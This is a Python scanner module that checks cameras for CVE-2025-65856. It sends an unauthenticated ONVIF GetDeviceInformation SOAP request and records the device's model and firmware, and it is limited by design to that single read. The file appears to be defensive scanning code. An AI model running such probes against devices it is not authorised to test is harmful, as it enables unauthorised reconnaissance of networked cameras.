"""CVE-2025-65856: the ONVIF device service answers without WS-Security.

The read is a SOAP `GetDeviceInformation`, which returns the manufacturer, the
model and the firmware instead of a picture. This class therefore records the
description and no frame, and it is the reason the ONVIF class is worth having
even when it produces no image (FR-019).

The action is an enum with one member, so a state-changing SOAP action cannot be
expressed from here.
"""

import enum
import xml.etree.ElementTree as ElementTree

from models.finding import CveClass
from scanners.cve.base import (
    AttemptResult,
    CveAttempt,
    CveTarget,
    ReadFailed,
    ReadMethod,
    ReadRequest,
    ReadResponse,
)

_SERVICE_PATH = "/onvif/device_service"
_SOAP_CONTENT_TYPE = "application/soap+xml"
_SOAP_ENVELOPE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
    '<s:Body><tds:{action} xmlns:tds='
    '"http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>'
)
# The response elements FR-019 asks for, by the local name ONVIF gives them.
_WANTED: tuple[tuple[str, str], ...] = (
    ("Model", "model"),
    ("FirmwareVersion", "firmware"),
)


class OnvifReadAction(enum.Enum):
    """The only ONVIF action this batch sends, and it only reads."""

    get_device_information = "GetDeviceInformation"


class XiongmaiOnvifInfo(CveAttempt):
    """The unauthenticated ONVIF device read (CVE-2025-65856)."""

    @property
    def cve_ids(self) -> tuple[str, ...]:
        return ("CVE-2025-65856",)

    @property
    def cve_class(self) -> CveClass:
        return CveClass.unauth_onvif

    def attempt(self, target: CveTarget) -> AttemptResult:
        outcomes = []
        for port in target.ports:
            described = self._read_port(target, port, outcomes)
            if described is not None:
                return described
        return AttemptResult.recorded(
            f"{self.cve_ids[0]}: no device description; " + "; ".join(outcomes)
        )

    def _read_port(
        self, target: CveTarget, port: int, outcomes: list[str]
    ) -> AttemptResult | None:
        """One port, and a port that never answers does not stop the next one."""
        try:
            response = self._transport.fetch(self._envelope(target, port))
        except ReadFailed as unreachable:
            outcomes.append(f"{port} unreachable: {unreachable}")
            return None
        described = self._described(response)
        if described is None:
            outcomes.append(f"{port} {response.describe()}")
        return described

    def _envelope(self, target: CveTarget, port: int) -> ReadRequest:
        action = OnvifReadAction.get_device_information.value
        return ReadRequest(
            method=ReadMethod.form_post,
            url=target.url(port, _SERVICE_PATH),
            body=_SOAP_ENVELOPE.format(action=action),
            content_type=_SOAP_CONTENT_TYPE,
        )

    def _described(self, response: ReadResponse) -> AttemptResult | None:
        """The description the answer carries, or None when it carries none."""
        if not response.is_ok or not response.body:
            return None
        fields = self._fields(self._parsed(response.body))
        if not fields:
            return None
        return AttemptResult(
            reason=(
                f"{self.cve_ids[0]}: the device description came back, and a "
                "description is not a picture"
            ),
            model=fields.get("model", ""),
            firmware=fields.get("firmware", ""),
        )

    def _parsed(self, body: bytes) -> ElementTree.Element | None:
        try:
            return ElementTree.fromstring(body)
        except ElementTree.ParseError:
            return None

    def _fields(self, root: ElementTree.Element | None) -> dict[str, str]:
        """The two fields, keyed by the local name without its namespace."""
        wanted = dict(_WANTED)
        found = {}
        for element in root.iter() if root is not None else []:
            key = wanted.get(self._local_name(element.tag))
            if key and element.text:
                found[key] = element.text.strip()
        return found

    def _local_name(self, tag: str) -> str:
        """The element name without the `{namespace}` ONVIF puts in front of it."""
        _namespace, _brace, local = tag.rpartition("}")
        return local
